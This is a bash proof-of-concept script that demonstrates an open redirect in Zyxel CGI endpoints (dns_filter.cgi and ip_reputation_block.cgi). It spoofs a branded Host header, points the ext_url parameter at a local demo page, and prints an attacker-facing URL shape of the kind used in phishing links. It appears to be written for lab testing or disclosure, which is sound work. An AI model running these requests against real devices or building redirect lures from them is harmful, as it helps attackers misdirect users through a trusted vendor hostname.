#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE="${1:-http://127.0.0.1:8080}"
HOST_HEADER="${2:-nap-slogin.nebula.zyxel.com:8080}"
TARGET="${3:-}"
HOST_PARAM="${4:-connectivitycheck.gstatic.com}"
DEMO_BIND_HOST="${DEMO_BIND_HOST:-127.0.0.1}"
DEMO_PORT="${DEMO_PORT:-18080}"
SERVER_PID=""
BASE_REACHABLE=1
DEMO_LOG="${DEMO_LOG:-${SCRIPT_DIR}/.demo-http.log}"

cleanup() {
  if [[ -n "${SERVER_PID}" ]] && kill -0 "${SERVER_PID}" 2>/dev/null; then
    kill "${SERVER_PID}" 2>/dev/null || true
    wait "${SERVER_PID}" 2>/dev/null || true
  fi
}

trap cleanup EXIT

start_demo_server() {
  local target_url

  target_url="http://${DEMO_BIND_HOST}:${DEMO_PORT}/guest-continue-demo.html"

  if curl -fs --max-time 3 "${target_url}" >/dev/null 2>&1; then
    echo "[*] Reusing existing demo server at ${target_url}"
    TARGET="${target_url}"
    return
  fi

  echo "[*] Starting local demo server from ${SCRIPT_DIR}"
  (
    cd "${SCRIPT_DIR}"
    python3 -m http.server "${DEMO_PORT}" --bind "${DEMO_BIND_HOST}" >"${DEMO_LOG}" 2>&1
  ) &
  SERVER_PID="$!"

  for _ in 1 2 3 4 5 6 7 8 9 10; do
    if curl -fs --max-time 3 "${target_url}" >/dev/null 2>&1; then
      echo "[*] Demo page available at ${target_url}"
      TARGET="${target_url}"
      return
    fi
    sleep 0.3
  done

  echo "[!] Failed to start local demo server on ${target_url}" >&2
  echo "[!] See ${DEMO_LOG} for server output" >&2
  exit 1
}

if [[ -z "${TARGET}" ]]; then
  start_demo_server
fi

DNS_URL="${BASE}/cgi-bin/dns_filter.cgi?host=${HOST_PARAM}&ext_url=${TARGET}"
IPREP_URL="${BASE}/cgi-bin/ip_reputation_block.cgi?host=${HOST_PARAM}&ext_url=${TARGET}"

echo "[*] Safe external destination for the demo"
echo "    ${TARGET}"
echo
echo "[*] Realistic attacker-facing URL shape"
echo "    http://${HOST_HEADER%%:*}/cgi-bin/ip_reputation_block.cgi?host=${HOST_PARAM}&ext_url=${TARGET}"
echo

if ! curl -fs --max-time 3 "${BASE}/" >/dev/null 2>&1; then
  BASE_REACHABLE=0
  echo "[!] Note: ${BASE} is not reachable right now, so the CGI redirect probe below will fail until the Zyxel lab listener is up."
  echo "[*] When the lab is ready, run:"
  echo "    curl -L -H \"Host: ${HOST_HEADER}\" \"${IPREP_URL}\""
  echo
fi

if [[ "${BASE_REACHABLE}" -eq 0 ]]; then
  exit 0
fi

echo "[*] dns_filter.cgi branded-host redirect"
curl -sS -D - -o /dev/null --max-time 8 \
  -H "Host: ${HOST_HEADER}" \
  "${DNS_URL}"

echo
echo "[*] ip_reputation_block.cgi branded-host redirect"
curl -sS -D - -o /dev/null --max-time 8 \
  -H "Host: ${HOST_HEADER}" \
  "${IPREP_URL}"

echo
echo "[*] Optional: follow the redirect locally for a clean showoff"
echo "    curl -L -H \"Host: ${HOST_HEADER}\" \"${IPREP_URL}\""
